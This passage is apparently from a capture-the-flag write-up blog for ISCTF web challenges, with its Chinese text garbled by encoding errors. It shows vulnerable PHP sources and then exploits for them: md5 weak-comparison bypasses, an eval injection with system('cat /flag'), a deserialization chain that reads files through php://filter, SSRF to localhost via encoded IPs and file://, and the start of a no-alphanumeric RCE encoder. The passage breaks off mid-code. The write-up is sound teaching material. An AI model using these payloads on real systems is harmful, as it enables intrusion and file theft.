class="keyword">echo</span> <span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,è¯·å¼€å§‹ä½ çš„ç­”é¢˜ã€‚&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;åšé¢˜å‰è¯·å‘Šè¯‰æˆ‘ä½ æ˜¯å°è“é²¨å—ï¼Ÿ&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å°è“é²¨æˆåŠŸä¸€åŠ&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;å‰é¢çš„å‡ºæ¥äº†å—ï¼Ÿ&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç­”æ¡ˆå°±åœ¨çœ¼å‰ï¼Ÿ&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,ä½ è§‰å¾—è¿™æ˜¯flagå—ï¼Ÿ&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag666</span> = <span class="variable">$f1</span>.<span class="variable">$Ag</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag666</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å°è“é²¨æˆåŠŸä¸€åŠ&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST1å¿…é¡»æ˜¯æ•°å­—ï¼ŒPOST1å’ŒPOST2ä¸ç›¸ç­‰ï¼Œä½†æ˜¯ä»–ä»¬çš„md5å€¼è¦ç›¸ç­‰ã€‚</p><p>è¿™é‡Œç”¨åˆ°äº†PHPç‰¹æ€§çš„çŸ¥è¯†ï¼Œmd5å¼±æ¯”è¾ƒã€‚</p><p>åŸç†ï¼š</p><blockquote><p>åœ¨ php ä¸­ï¼Œå½“å­—ç¬¦ä¸² ä»¥0eå¼€å¤´æ—¶ï¼Œä¼šè¢« php è¯†åˆ«æˆç§‘å­¦è®¡æ•°æ³•ï¼Œä¼šè¢«è®¤ä¸ºæ˜¯æ•°å­—ã€‚</p></blockquote><p>Payload1ï¼š<code>http://120.79.18.34:20867/?NAME=1&amp;P0ST1=0e545993274517709034328855841020&amp;P0ST2=s878926199a</code></p><p>ç¬¬äºŒå±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;å‰é¢çš„å‡ºæ¥äº†å—ï¼Ÿ&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç­”æ¡ˆå°±åœ¨çœ¼å‰ï¼Ÿ&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,ä½ è§‰å¾—è¿™æ˜¯flagå—ï¼Ÿ&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ±‚$GET1ä¸èƒ½ä¸ºæ•°å­—ï¼Œè€Œä¸”$GET1åˆç­‰äº0ï¼Œå¹¶ä¸”$GET2ä¸èƒ½ä¸ºæ•°å­—ï¼Œå€¼å¤§äº678ã€‚</p><p>å¼±ç±»å‹æ¯”è¾ƒï¼š</p><blockquote><p>php ä¸­0 ä¸ä»»ä½•å­—ç¬¦ä¸²æ¯”è¾ƒéƒ½ä¸º trueï¼Œå› ä¸ºå­—ç¬¦ä¸²è¢«å¼ºåˆ¶è½¬æ¢ï¼ˆæˆªæ–­ï¼‰åéƒ½æˆäº† 0ã€‚</p></blockquote><p>Payload2ï¼š<code>GET1=a&amp;GET2=6782s</code></p><p>å‰åŠæ®µçš„flagè¦ç»è¿‡hexç¼–ç ï¼ŒååŠæ®µç»è¿‡base64è§£ç åå¯ä»¥å¾—åˆ°ä¸€ä¸ªunicodeå†è§£ç å³å¯ã€‚</p><p>ISCTF{4f759692-a911-4f11-bf22-ddaa305514c0}</p><h2 id="simplephp"><a href="#simplephp" class="headerlink" title="simplephp"></a>simplephp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;#\\\\\\\\/Ilikeisctf#&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good try!&quot;</span>;</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;come on!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ±‚preg_match($pattern,$str,$arr)ï¼Œå°±æ˜¯patternè¦åœ¨strå†…ï¼Œæ³¨æ„#æ˜¯ç•Œå®šç¬¦ï¼Œæ‰€ä»¥è¿™ä¿©#éƒ½ä¸èƒ½åŠ ã€‚<code>str=\\\\\\\\/Ilikeisctf</code>ã€‚</p><p>numé€šè¿‡is_numericçš„æ£€æµ‹ï¼Œå¹¶ä¸”ä¸ç­‰äº36ï¼Œå»ç©ºåä¾ç„¶ä¸ç­‰äº36ï¼Œç»è¿‡è¿‡æ»¤æ–¹æ³•åç­‰äºè¦36ã€‚</p><p>fuzzä¸€ä¸‹ï¼Œexp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">127</span>; <span class="variable">$i</span>++) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="string">&#x27;36&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:<code>http://120.79.18.34:20545/?str=\\\\\\\\/Ilikeisctf&amp;num=36%0C&amp;cmd=system(&#39;cat /flag&#39;);</code></p><p>ISCTF{59551edf-ece1-4878-a4a8-7d10e0dbfb19}</p><h2 id="çŒ«å’Œè€é¼ "><a href="#çŒ«å’Œè€é¼ " class="headerlink" title="çŒ«å’Œè€é¼ "></a>çŒ«å’Œè€é¼ </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Good. You caught the mouse:&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dog</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cat&quot;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–</p><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–åŠ ä¸€ä¸ªphpä¼ªåè®®çš„åˆ©ç”¨ã€‚ åˆ©ç”¨includeæ‰§è¡Œphpä¼ªåè®®é€ æˆæ–‡ä»¶è¯»å– ä¸»è¦æ˜¯ç»•è¿‡åœ¨æ‰§è¡Œææ„å‡½æ•°çš„æ—¶å€™ç»•è¿‡dogä¼šæŠŠcatå†…çš„aå±æ€§ç»™å˜æˆIâ€™m a vicious dog, Kitty åˆ©ç”¨å¼•ç”¨ç»•è¿‡</p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$abc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cat</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$abc</span>);</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹<code>$this-&gt;b = &amp;$this-&gt;a;</code>ä¸­&amp;æ˜¯å–åœ°å€ç¬¦å·ï¼Œæ„æ€æ˜¯bå°†æŒ‡å‘açš„åœ°å€ç©ºé—´ï¼Œè¿™æ—¶aå’Œbéƒ½æ˜¯æŒ‡å‘åŒä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œç»™bèµ‹å€¼å°±ç›¸å½“äºç»™aèµ‹å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload:cat=O:3:%22cat%22:3&#123;s:1:%22a%22;N;s:1:%22b%22;R:2;s:1:%22c%22;O:5:%22mouse%22:1&#123;s:1:%22v%22;s:52:%22php://filter/convert.base64-encode/resource=flag.php%22;&#125;&#125;</span><br></pre></td></tr></table></figure><p>base64è§£ç ä¸€ä¸‹å³å¯ã€‚</p><p>ISCTF{c98bfcc5-5688-4c9f-b11a-b61f3ff01b9f}</p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>è¿™é‡Œæœ‰ä¸ªthiså¯ä»¥ç‚¹å‡»ï¼Œç„¶åæç¤ºè®©æˆ‘ä»¬ä»æœ¬åœ°è®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°flagåœ¨wwwç›®å½•ä¸‹ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/2XJlHROuPGkwpFj.png" alt="image-20221105222032500.png"></p><p>çœ‹æºç ï¼Œå‘ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;urls&#x27;]))&#123;</span><br><span class="line">$urls = $_GET[&#x27;urls&#x27;];</span><br><span class="line">$url_host = parse_url($urls,PHP_URL_HOST);</span><br><span class="line">//Do something~~~~</span><br><span class="line">curl_get($urls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯è®©æˆ‘ä»¬ä¼ ä¸€ä¸ªurlåœ°å€ï¼Œä¸€é“ssrfã€‚</p><p>å…ˆå°è¯•<code>?urls=http://127.0.0.1/flag.php</code>å‘ç°è¢«è¿‡æ»¤äº†ï¼Œlocalhostä¹Ÿä¸è¡Œã€‚</p><p><img src="https://s2.loli.net/2023/08/04/QjOwrS8kZYc4WIv.png" alt="image-20221105222956977.png"></p><p>å°è¯•æŠŠ127.0.0.1è½¬åŒ–ä¸ºå…¶ä»–è¿›åˆ¶è¯•è¯•çœ‹ï¼ˆä¹Ÿæ˜¯èƒ½è®¿é—®çš„ï¼‰</p><blockquote><p>2130706433 10è¿›åˆ¶ <a href="http://2130706433">http://2130706433</a><br>017700000001 8è¿›åˆ¶ <a href="http://017700000001">http://017700000001</a><br>7F000001 16è¿›åˆ¶ <a href="http://0x7F000001">http://0x7F000001</a></p></blockquote><p>å°è¯•10è¿›åˆ¶å¯ä»¥,<code>?urls=http://2130706433/flag.php</code></p><p>è¿˜æœ‰ä¸€ç§è§£æ³•ï¼Œçœ‹åˆ°æ³¨é‡Šé‡ŒDo something~~~~å°±æ˜¯å¯¹urlsåšäº†äº›å¤„ç†ï¼Œphpé‡Œå¹¶æ²¡æœ‰curl_getå‡½æ•°ï¼Œparse_urlå¯¹urlè¿›è¡Œäº†åˆ†å‰²ã€‚é‚£ä¹ˆå¯ä»¥å¯ä»¥çŒœæµ‹curl_getå‡½æ•°æ˜¯è·å¾—èµ„æºçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.18.34:20010/?urls=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.18.34:20010/?urls=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>ISCTF{c706d632-5edf-4c4b-bf52-a3676c8411d9}</p><h2 id="rceï¼Ÿ"><a href="#rceï¼Ÿ" class="headerlink" title="rceï¼Ÿ"></a>rceï¼Ÿ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="keyword">eval</span>(<span class="variable">$code</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡æ»¤äº†æ•°å­—å’Œå­—æ¯ï¼Œå¾ˆæ˜æ˜¾æ— æ•°å­—å­—æ¯rceã€‚</p><p>exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;tac /f*&quot;;</span><br><span class="line">echo &quot;(\&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; strlen($a); $i++) &#123; </span><br><span class="line">    echo &quot;%&quot;.dechex(ord($a[$i])^0xff);</span><br><span class="line">&#125;</span><br><span class="line">echo 